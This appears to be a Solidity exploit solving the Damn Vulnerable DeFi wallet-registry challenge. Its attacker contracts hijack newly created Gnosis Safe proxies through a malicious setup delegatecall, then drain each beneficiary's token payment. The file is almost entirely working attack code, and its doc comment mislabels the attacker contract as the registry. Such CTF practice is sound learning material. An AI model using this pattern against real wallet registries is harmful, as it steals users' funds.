// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/auth/Ownable.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/base/ModuleManager.sol";
import "../DamnValuableToken.sol";

/**
 * @title WalletRegistry
 * @notice A registry for Gnosis Safe wallets.
 *            When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.
 * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract GnosisSafeAttacker is GnosisSafe {
    uint256 private constant PAYMENT_AMOUNT = 10 ether;
    function withdraw(address attacker, DamnValuableToken token) external {
        token.transfer(attacker, PAYMENT_AMOUNT);
    }
}

contract ModuleAttacker {
    address internal singleton;
    function changeSingleton(address newSingleton) external {
        singleton = newSingleton;
    }
}

contract WalletRegistryAttacker {
    uint256 private constant EXPECTED_OWNERS_COUNT = 1;
    uint256 private constant EXPECTED_THRESHOLD = 1;
    uint256 private constant PAYMENT_AMOUNT = 10 ether;

    constructor(
        GnosisSafe masterCopy,
        GnosisSafeProxyFactory walletFactory,
        IProxyCreationCallback walletRegistry,
        DamnValuableToken token,
        address[] memory targetOwners
    ) {
        ModuleAttacker moduleAttacker = new ModuleAttacker();
        GnosisSafeAttacker gnosisSafeAttacker = new GnosisSafeAttacker();
        for (uint i = 0; i < targetOwners.length; i++) {
            bytes memory data = abi.encodeWithSelector(ModuleAttacker.changeSingleton.selector, address(gnosisSafeAttacker));
            address[] memory owners = new address[](1);
            owners[0] = targetOwners[i];
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector, 
                owners, 
                1,
                address(moduleAttacker),
                data,
                address(0),
                address(0),
                0,
                address(0)
            );
            GnosisSafeProxy walletProxy = walletFactory.createProxyWithCallback{gas: 1e7}(address(masterCopy), initializer, 0, walletRegistry);
            GnosisSafeAttacker(payable(address(walletProxy))).withdraw(msg.sender, DamnValuableToken(address(token)));
        }
    }
}
